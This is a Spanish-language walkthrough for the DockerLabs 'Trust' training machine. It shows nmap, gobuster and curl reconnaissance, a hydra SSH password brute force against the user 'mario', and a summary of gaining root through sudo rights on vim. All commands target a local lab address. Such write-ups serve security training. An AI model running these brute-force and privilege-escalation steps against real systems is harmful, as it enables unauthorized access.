
# DockerLabs - Trust Walkthrough

[![DockerLabs](https://img.shields.io/badge/DockerLabs-Trust-blue)](https://dockerlabs.es)
[![Difficulty](https://img.shields.io/badge/Difficulty-Fácil-green)]()
[![Techniques](https://img.shields.io/badge/Techniques-SSH%20Bruteforce%20%7C%20Sudo%20Abuse-red)]()

---

# 📌 Descripción

Máquina de dificultad **Fácil** donde realizamos enumeración de servicios, fuerza bruta SSH y escalada de privilegios abusando de permisos sudo en `vim`.

---

# 📡 Reconocimiento

## Escaneo de puertos

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.18.0.2 -oG allPorts

![[nmap2.png]]

---

## Enumeración web

### Gobuster

gobuster dir -u http://172.18.0.2 -w <WORDLIST> -x php,html,txt -t 20

![[Gobuster2.png]]

---

## Análisis web

curl http://172.18.0.2

![[Curl2.png]]

---

# 🔐 Ataque SSH

hydra -l mario -P <WORDLIST> ssh://172.18.0.2 -t 4

![[Hydra2.png]]

---

## Acceso SSH

ssh mario@172.18.0.2

![[SSH2.png]]

---

# 🧗 Escalada de privilegios

## Enumeración sudo

sudo -l

![[Sudo2.png]]

---

## Root

whoami  
id  

![[Root2.png]]

---

# 📋 Resumen

| Paso | Herramienta | Resultado |
|---|---|---|
| Nmap | Escaneo | Puertos 22/80 |
| Gobuster | Fuzzing web | Descubrimiento |
| Curl | Enumeración | Info usuario |
| Hydra | Fuerza bruta | Credenciales |
| SSH | Acceso inicial | mario |
| sudo -l | Priv esc | vim permitido |
| Vim | Root | control total |

---

# 🧠 Notas

- Enumerar siempre primero
- Revisar web antes de atacar SSH
- Validar credenciales reutilizadas
- Revisar sudo antes de escalar